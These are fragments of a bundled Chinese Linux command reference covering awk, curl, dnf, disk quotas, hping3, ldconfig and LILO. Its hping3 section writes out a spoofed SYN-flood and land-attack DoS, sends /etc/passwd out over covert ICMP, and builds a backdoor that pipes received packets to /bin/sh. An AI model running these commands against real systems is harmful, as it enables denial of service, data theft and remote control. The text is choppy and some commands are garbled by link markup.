} END{ print &quot;end&quot; }&#39; file\\n</code></pre><p>一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被<strong>单引号</strong>或<strong>双引号</strong>中，例如：</p>\\n<pre><code>awk &#39;BEGIN{ i=0 } { i++ } END{ print i }&#39; filename\\nawk &quot;BEGIN{ i=0 } { i++ } END{ print i }&quot; filename\\n</code></pre><h3 id=\\\"awk-\\\">awk的工作原理</h3>\\n<pre><code>awk &#39;BEGIN{ commands } pattern{ commands } END{ commands }&#39;\\n</code></pre><ul>\\n<li>第一步：执行<code>BEGIN{ commands }</code>语句块中的语句；</li>\\n<li>第二步：从文件或标准输入(stdin)读取一行，然后执行<code>pattern{ commands }</code>语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。</li>\\n<li>第三步：当读至输入流末尾时，执行<code>END{ commands }</code>语句块。</li>\\n</ul>\\n<p><strong>BEGIN语句块</strong>在awk开始从输入流中读取行<strong>之前</strong>被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。</p>\\n<p><strong>END语句块</strong>在awk从输入流中读取完所有的行<strong>之后</strong>即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。</p>\\n<p><strong>pattern语句块</strong>中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行<code>{ print }</code>，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。</p>\\n<p><strong>示例</strong></p>\\n<pre><code>[echo](https://philipding.github.io/linux-command/echo &quot;echo命令&quot;) -e &quot;A line 1nA line 2&quot; | awk &#39;BEGIN{ print &quot;Start&quot; } { print } END{ print &quot;End&quot; }&#39;\\nStart\\nA line 1\\nA line 2\\nEnd\\n</code></pre><p>当使用不带参数的<code>print</code>时，它就打印当前行，当<code>print</code>的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：</p>\\n<pre><code>echo | awk &#39;{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1,var2,var3; }&#39; \\nv1 v2 v3\\n</code></pre><p>双引号拼接使用：</p>\\n<pre><code>echo | awk &#39;{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1&quot;=&quot;var2&quot;=&quot;var3; }&#39;\\nv1=v2=v3\\n</code></pre><p>{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。</p>\\n<h2 id=\\\"awk-\\\">awk内置变量（预定义变量）</h2>\\n<p>说明：[A][N][P][G]表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk</p>\\n<pre><code>**$n** 当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 \\n**$0** 这个变量包含执行过程中当前行的文本内容。\\n[N] **ARGC** 命令行参数的数目。\\n[G] **ARGIND** 命令行中当前文件的位置（从0开始算）。\\n[N] **ARGV** 包含命令行参数的数组。\\n[G] **CONVFMT** 数字转换格式（默认值为%.6g）。\\n[P] **ENVIRON** 环境变量关联数组。\\n[N] **ERRNO** 最后一个系统错误的描述。\\n[G] **FIELDWIDTHS** 字段宽度列表（用空格键分隔）。\\n[A] **FILENAME** 当前输入文件的名。\\n[P] **FNR** 同NR，但相对于当前文件。\\n[A] **FS** 字段分隔符（默认是任何空格）。\\n[G] **IGNORECASE** 如果为真，则进行忽略大小写的匹配。\\n[A] **NF** 表示字段数，在执行过程中对应于当前的字段数。\\n[A] **NR** 表示记录数，在执行过程中对应于当前的行号。\\n[A] **OFMT** 数字的输出格式（默认值是%.6g）。\\n[A] **OFS** 输出字段分隔符（默认值是一个空格）。\\n[A] **ORS** 输出记录分隔符（默认值是一个换行符）。\\n[A] **RS** 记录分隔符（默认是一个换行符）。\\n[N] **RSTART** 由match函数所匹配的字符串的第一个位置。\\n[N] **RLENGTH** 由match函数所匹配的字符串的长度。\\n[N] **SUBSEP** 数组下标分隔符（默认值是34）。\\n</code></pre><p><strong>示例</strong></p>\\n<pre><code>echo -e &quot;line1 f2 f3nline2 f4

$3=f7\\n</code></pre><p>使用<code>print $NF</code>可以打印出一行中的最后一个字段，使用<code>$(NF-1)</code>则是打印倒数第二个字段，其他以此类推：</p>\\n<pre><code>echo -e &quot;line1 f2 f3n line2 f4 f5&quot; | awk &#39;{print $NF}&#39;\\nf3\\nf5\\n</code></pre><pre><code>echo -e &quot;line1 f2 f3n line2 f4 f5&quot; | awk &#39;{print $(NF-1)}&#39;\\nf2\\nf4\\n</code></pre><p>打印每一行的第二和第三个字段：</p>\\n<pre><code>awk &#39;{ print $2,$3 }&#39; filename\\n</code></pre><p>统计文件中的行数：</p>\\n<pre><code>awk &#39;END{ print NR }&#39; filename\\n</code></pre><p>以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。</p>\\n<p>一个每一行中第一个字段值累加的例子：</p>\\n<pre><code>[seq](https://philipding.github.io/linux-command/seq &quot;seq命令&quot;) 5 | awk &#39;BEGIN{ [sum](https://philipding.github.io/linux-command/sum &quot;sum命令&quot;)=0; print &quot;总和：&quot; } { print $1&quot;+&quot;; sum+=$1 } END{ print &quot;等于&quot;;

id=\\\"-awk\\\">将外部变量值传递给awk</h2>\\n<p>借助<strong><code>-v</code>选项</strong>，可以将外部值（并非来自stdin）传递给awk：</p>\\n<pre><code>VAR=10000\\necho | awk -v VARIABLE=$VAR &#39;{ print VARIABLE }&#39;\\n</code></pre><p>另一种传递外部变量方法：</p>\\n<pre><code>var1=&quot;aaa&quot;\\nvar2=&quot;bbb&quot;\\necho | awk &#39;{ print v1,v2 }&#39; v1=$var1 v2=$var2\\n</code></pre><p>当输入来自于文件时使用：</p>\\n<pre><code>awk &#39;{ print v1,v2 }&#39; v1=$var1 v2=$var2 filename\\n</code></pre><p>以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。</p>\\n<h2 id=\\\"awk-\\\">awk运算与判断</h2>\\n<p>作为一种程序设计语言所应具有的特点之一，awk支持多种运算，这些运算与C语言提供的基本相同。awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式~（匹配）和~!（不匹配）。作为对测试的一种扩充，awk也支持用逻辑运算符。</p>\\n<h3

( (i,j) in array)</code>这样的语法，但是下标必须放置在圆括号中。类似一维数组的循环访问，多维数组使用<code>for ( item in array )</code>这样的语法遍历数组。与一维数组不同的是，多维数组必须使用<code>split()</code>函数来访问单独的下标分量。</p>\\n<pre><code>awk

[install](https://philipding.github.io/linux-command/install &quot;install命令&quot;) curl</code>安装，也可以下载安装。curl是将下载文件输出到stdout，将进度信息输出到stderr，不显示进度信息使用<code>--silent</code>选项。</p>\\n<pre><code>curl URL --silent\\n</code></pre><p>这条命令是将下载文件输出到终端，所有下载的数据都被写入到stdout。</p>\\n<p>使用选项<code>-O</code>将下载的数据写入到文件，必须使用文件的绝对地址：</p>\\n<pre><code>curl http://[man](https://philipding.github.io/linux-command/man &quot;man命令&quot;).linuxde.net/text.iso --silent -O\\n</code></pre><p>选项<code>-o</code>将下载数据写入到指定名称的文件中，并使用<code>--progress</code>显示进度条：</p>\\n<pre><code>curl

-URL\\n</code></pre><p><strong>使用curl设置参照页字符串</strong></p>\\n<p>参照页是位于HTTP头部中的一个字符串，用来表示用户是从哪个页面到达当前页面的，如果用户点击网页A中的某个连接，那么用户就会跳转到B网页，网页B头部的参照页字符串就包含网页A的URL。</p>\\n<p>使用<code>--referer</code>选项指定参照页字符串：</p>\\n<pre><code>curl --referer http://www.google.com http://man.linuxde.net\\n</code></pre><p><strong>用curl设置cookies</strong></p>\\n<p>使用<code>--cookie &quot;COKKIES&quot;</code>选项来指定cookie，多个cookie使用分号分隔：</p>\\n<pre><code>curl http://man.linuxde.net --cookie &quot;user=root;pass=123456&quot;\\n</code></pre><p>将cookie另存为一个文件，使用<code>--cookie-jar</code>选项：</p>\\n<pre><code>curl URL --cookie-jar cookie_file\\n</code></pre><p><strong>用curl设置用户代理字符串</strong></p>\\n<p>有些网站访问会提示只能使用IE浏览器来访问，这是因为这些网站设置了检查用户代理，可以使用curl把用户代理设置为IE，这样就可以访问了。使用<code>--user-agent</code>或者<code>-A</code>选项：</p>\\n<pre><code>curl URL --user-agent &quot;Mozilla/5.0&quot;\\ncurl URL -A &quot;Mozilla/5.0&quot;\\n</code></pre><p>其他HTTP头部信息也可以使用curl来发送，使用<code>-H</code>&quot;头部信息&quot; 传递多个头部信息，例如：</p>\\n<pre><code>curl -H &quot;Host:man.linuxde.net&quot; -H &quot;[accept](https://philipding.github.io/linux-command/accept &quot;accept命令&quot;)-language:zh-cn&quot;

50k\\n</code></pre><p>命令中用k（千字节）和m（兆字节）指定下载速度限制。</p>\\n<p>使用<code>--max-filesize</code>指定可下载的最大文件大小：</p>\\n<pre><code>curl URL --max-filesize bytes\\n</code></pre><p>如果文件大小超出限制，命令则返回一个非0退出码，如果命令正常则返回0。</p>\\n<p><strong>用curl进行认证</strong></p>\\n<p>使用curl选项 -u 可以完成HTTP或者FTP的认证，可以指定密码，也可以不指定密码在后续操作中输入密码：</p>\\n<pre><code>curl -u

yum install epel-release -y\\n</code></pre><p>其实这里并没有强制使用”-y”的理由，相反的，在不使用”-y”的情况下，用户可以在安装过程中查看到底有哪些东西被安装进了系统。但对于没有这个需求的用户，您可以在 YUM 中使用”-y”参数来自动安装所有东西。</p>\\n<p>2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令：</p>\\n<pre><code># yum install dnf\\n</code></pre><p>然后， DNF 包管理器就被成功的安装到你的系统中了。接下来，是时候开始我们的教程了！在这个教程中，您将会学到27个用于 DNF 包管理器的命令。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，让我们开始学习 DNF

系统管理者的欢迎。举例如下：</p>\\n<ol>\\n<li>在 DNF 中没有 –skip-broken 命令，并且没有替代命令供选择。</li>\\n<li>在 DNF 中没有判断哪个包提供了指定依赖的 resolvedep 命令。</li>\\n<li>在 DNF 中没有用来列出某个软件依赖包的 deplist 命令。</li>\\n<li>当你在 DNF 中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。</li>\\n</ol>\\n\";\n\n/***/ }),\n/* 134 */\n/***/ (function(module, exports) {\n\nmodule.exports =

/etc/fstab\\n</code></pre><p>找到对应于<code>/home</code>和<code>/www</code>的行，例如：</p>\\n<pre><code>/dev/sda5 /home ext2 defaults 1 2\\n/dev/sda7 /www ext2 defaults 1 2\\n</code></pre><p>在<code>/home</code>里实现用户级的磁盘配额，所以对sda5行的挂装选项域做如下修改：</p>\\n<pre><code>/dev/sda5 /home ext2 defaults，usrquota 1

2\\n</code></pre><p>如编辑根用户</p>\\n<p>改<code>/etc/fstab</code>文件中</p>\\n<pre><code>LABEL=/ / ext2 defaults,usrquota,grpquota 1

href=\\\"https://philipding.github.io/linux-command/fsck\\\" title=\\\"fsck命令\\\">fsck</a>时检查的顺序。</li>\\n</ul>\\n<p>注意：请特别注意这里的拼写，是usrquota和grpquota，不要写成userquota和groupquota。</p>\\n<p>进入单用户模式，用<a href=\\\"https://philipding.github.io/linux-command/quotacheck\\\" title=\\\"quotacheck命令\\\">quotacheck</a>生成.user或.group文件</p>\\n<p>quotacheck 你的目录</p>\\n<pre><code>example:quotacheck / ; quotacheck /home\\n</code></pre><p>如果单用户模式报错的话<a href=\\\"https://philipding.github.io/linux-command/umount\\\" title=\\\"umount命令\\\">umount</a>你的设备<code>/dev/hda*</code></p>\\n<p>再执行就ok了，重启动系统，如果一切正常的话，quota将开始正常工作。</p>\\n<p><strong>设置用户和组配额的分配量</strong></p>\\n<p>对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。</p>\\n<ul>\\n<li>软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。</li>\\n<li>硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。</li>\\n</ul>\\n<p><strong>通过edquota直接编辑数据文件：</strong></p>\\n<p>使用编辑配额命令edquota为用户配置定额，在重新启动系统之后，我们假设lanf是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额：</p>\\n<pre><code>edquota -u lanf\\n</code></pre><p>这个命令将启动默认文本编辑器（如vi或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示：</p>\\n<pre><code>Quotas for user lanf:\\n/dev/sda5:blocks in use:0,limits(soft = 0,hard = 0)\\ninodes in use:0,limits(soft = 0,hard = 0)\\n</code></pre><p>这表示lanf用户在<code>/dev/sda5</code>分区（该分区已经在usrquota的控制之下）中迄今使用了0个数据块（以K为单位），并且没有设限制（包括软限制soft和硬限制hard），同样，lanf在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改blocks行的limits部分就可以了，注意单位使用的是K。例如要为lanf分配100M磁盘的软限制，400M硬限制，可以使用如下的设置：</p>\\n<pre><code>Quotas for user lanf:\\n/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\\ninodes in use:0,limits(soft = 0,hard = 0)\\n</code></pre><p>同样的，要对文件目录的数量限制可以相应的修改inodes行。我们也可以同时对这两项都作出限制。只需要如下的修改Quotas for user lanf：</p>\\n<pre><code>/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\\ninodes in use:0,limits(soft = 12800,hard = 51200)\\n</code></pre><p>这表示除了相应的容量的限制外，还对文件/目录的数量做了12800个的软限制和51200个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好edquota还有个-p参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对Jack、Tom、Chen三个用户使用和lanf一样的限额配置，可以使用如下的命令：</p>\\n<pre><code>edquota -p lanf -u Jack Tom Chen\\n</code></pre><p>这样一来，这三个用户就被赋予了和lanf一样的磁盘配额。</p>\\n<p>对组的配额，除了edquota命令中对应<code>-u</code>选项的改为<code>-g</code>选项，例如下面对webterm1组的操作：</p>\\n<pre><code>edquota -g webterm1\\n</code></pre><p>实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用edquota命令的<code>-t</code>选项来实现。运行下面的命令：</p>\\n<pre><code>edquota -t\\n</code></pre><p>edquota将打开缺省编辑器显示如下内容：</p>\\n<pre><code>[time](https://philipding.github.io/linux-command/time &quot;time命令&quot;) units may be:days,hours,minutes,or seconds\\nGrace period before

&quot;file命令&quot;) grace period:0 days\\n</code></pre><p>可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有6个小时。</p>\\n<pre><code>Time units may be:days,hours,minutes,or seconds\\nGrace period before enforcing soft limits for users:\\n/dev/sda5:block grace period:2 days,file grace period:6

用户名/组名\\n</code></pre><p><strong>查看用户磁盘使用情况</strong></p>\\n<p>要查明某一个用户使用了多少磁盘空间，例如lanf，可以使用如下的命令：</p>\\n<pre><code>quota -u lanf\\n</code></pre><p>显示：</p>\\n<pre><code>Disk quotas for user lanf(uid 503):\\nFilesystem blocks quota limit grace file quota limit grace\\n/dev/sda5 3 102400 409800 1 12800 51200\\n</code></pre><p>同样，可以使用<code>quota -g groupname</code>命令来参看某个组的磁盘使用情况。</p>\\n<p>注意：</p>\\n<ol>\\n<li>如果该用户没有配置磁盘限额的话，输出显示<code>Disk quotas for user hujm (uid 503):

id=\\\"hping3-\\\">Hping3功能</h3>\\n<p>Hping3主要有以下典型功能应用：</p>\\n<h4 id=\\\"-\\\">防火墙测试</h4>\\n<p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href=\\\"http://0daysecurity.com/articles/hping3_examples.html\\\">http://0daysecurity.com/articles/hping3_examples.html</a></p>\\n<p>测试防火墙对ICMP包的反应、是否支持<a href=\\\"https://philipding.github.io/linux-command/traceroute\\\" title=\\\"traceroute命令\\\">traceroute</a>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>\\n<pre><code>hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10\\n</code></pre><h4 id=\\\"-\\\">端口扫描</h4>\\n<p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>\\n<pre><code>hping3 -I eth0  -S 192.168.10.1 -p 80\\n</code></pre><p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>\\n<p>hping3支持非常丰富的端口探测方式，<a href=\\\"https://philipding.github.io/linux-command/nmap\\\" title=\\\"nmap命令\\\">nmap</a>拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>\\n<h4 id=\\\"idle-\\\">Idle扫描</h4>\\n<p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>\\n<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>\\n<h4 id=\\\"-\\\">拒绝服务攻击</h4>\\n<p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>\\n<pre><code>hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000\\n</code></pre><p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>\\n<h4 id=\\\"-\\\">文件传输</h4>\\n<p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>\\n<pre><code>hping3 192.168.1.159--listen signature --safe  --icmp\\n</code></pre><p>监听ICMP包中的签名，根据签名解析出文件内容。</p>\\n<p>在发送端使用签名打包的ICMP包发送文件：</p>\\n<pre><code>hping3 192.168.1.108--icmp ?d 100 --sign signature --[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;) /etc/[passwd](https://philipding.github.io/linux-command/passwd &quot;passwd命令&quot;)\\n</code></pre><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>\\n<h4 id=\\\"-\\\">木马功能</h4>\\n<p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<a href=\\\"https://philipding.github.io/linux-command/nc_netcat\\\" title=\\\"netcat命令\\\">netcat</a>的后门功能类似。</p>\\n<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>\\n<p>在木马启动端：</p>\\n<pre><code>hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\\n</code></pre><p>在远程控制端：</p>\\n<pre><code>echo [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) &gt;[test](https://philipding.github.io/linux-command/test &quot;test命令&quot;).cmd\\nhping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\\n</code></pre><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>\\n<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>\\n\";\n\n/***/ }),\n/* 219 */\n/***/

监测能检测到的所有网络接口的状态信息。使用发现，比加上-l参数还多一个plip0的接口信息，搜索一下发现这是并口（网络设备中有一 个叫PLIP (Parallel Line Internet Protocol). 它提供了并口...）\\n-z 隐藏流量是无的接口，例如那些接口虽然启动了但是未用的\\n-i 指定要监测的接口,后面跟网络接口名\\n-s 等于加-d

报告所有监测接口的全部带宽（最后一列有个total，显示所有的接口的in流量和所有接口的out流量，简单的把所有接口的in流量相加,out流量相 加）\\n-[w](https://philipding.github.io/linux-command/w &quot;w命令&quot;)  用指定的列宽，而不是为了适应接口名称的长度而去自动放大列宽\\n-W

等协议的私有网络。这样一来，所有的内部主机都可以拥有公网 IP 而直接连接到互联网，也就同时暴露于互联网上的各种威胁之中了。那么，如何配置 IPv6 防火墙使其默认将除了 ping6 请求之外的所有输入数据包都丢弃呢？可以使用<a href=\\\"http://tools.ietf.org/html/rfc4193\\\">FC00::/7</a> 前缀来标识本地 IPv6

CONF：此选项指定动态链接库的配置文件为CONF，系统默认为/etc/ld.so.conf。\\n-C CACHE：此选项指定生成的缓存文件为CACHE，系统默认的是/etc/ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。\\n-r ROOT：此选项改变应用程序的根目录为ROOT（是调用[chroot](https://philipding.github.io/linux-command/chroot &quot;chroot命令&quot;)函数实现的）。选择此项时，系统默认的配置文件/etc/ld.so.conf，实际对应的为ROOT/etc/ld.so.conf。如用-r /usr/zzz时，打开配置文件/etc/ld.so.conf时，实际打开的是/usr/zzz/etc/ld.so.conf文件。用此选项，可以大大增加动态链接库管理的灵活性。\\n-l：通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。\\n-p或--print-cache：此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字。\\n-c

href=\\\"https://philipding.github.io/linux-command/mysql\\\" title=\\\"mysql命令\\\">mysql</a>到<code>/usr/local/mysql</code>，mysql有一大堆library在<code>/usr/local/mysql/lib</code>下面，这时就需要在<code>/etc/ld.so.conf</code>下面加一行<code>/usr/local/mysql/lib</code>，保存过后ldconfig一下，新的library才能在程序运行时被找到。</li>\\n<li>如果想在这两个目录以外放lib，但是又不想在<code>/etc/ld.so.conf</code>中加东西（或者是没有权限加东西）。那也可以，就是<a

LILO（并可以将机器引导到新的 Linux 安装）。</p>\\n<p>要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入：</p>\\n<pre><code>/sbin/lilo -v -v\\n</code></pre><p>这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。</p>\\n<p><strong>配置 LILO</strong></p>\\n<p>LILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的：</p>\\n<p>主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 <a href=\\\"https://philipding.github.io/linux-command/grub\\\" title=\\\"grub命令\\\">grub</a> 术语中是 hd0,0）。</p>\\n<p>从 HDD（物理磁盘 2）上安装了 Red Hat Linux；root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。</p>\\n<p>lilo.conf 示例文件：</p>\\n<pre><code>boot=/dev/hda\\nmap=/boot/map\\n[install](https://philipding.github.io/linux-command/install &quot;install命令&quot;)=/boot/boot.b\\nprompt\\ntimeout=100\\ncompact\\ndefault=Linux\\nimage=/boot/vmlinuz-2.4.18-14\\n    label=Linux\\n    root=/dev/hdb3\\n    [read](https://philipding.github.io/linux-command/read &quot;read命令&quot;)-only\\n    password=linux\\nother=/dev/hda\\n    label=WindowsXP\\n</code></pre><p>配置文件选项说明：</p>\\n<ul>\\n<li>boot= 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序；然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。</li>\\n<li>map= 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！</li>\\n<li>install= 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！</li>\\n<li>prompt= 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。</li>\\n<li>timeout= 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。</li>\\n<li>compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。</li>\\n<li>default= 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。</li>\\n<li>对于允许用户引导到的每一个 Linux 版本，都应该指定 image= 及以下三个选项。image 选项指定希望 引导到的内核版本。</li>\\n<li>label= 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格；否则，引导那个文件时会出现无法预期的错误。）</li>\\n<li>root= 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。</li>\\n<li>read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。</li>\\n<li>password= 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。</li>\\n<li>other= 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。</li>\\n<li>label= 与所有其他 label 选项相同。</li>\\n</ul>\\n<p>在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（<a href=\\\"https://philipding.github.io/linux-command/man\\\" title=\\\"man命令\\\">man</a> lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行：</p>\\n<pre><code>/sbin/lilo -v -v\\n</code></pre><p><code>-v -v</code>标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。</p>\\n<p><strong>初始引导过程</strong></p>\\n<p>当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 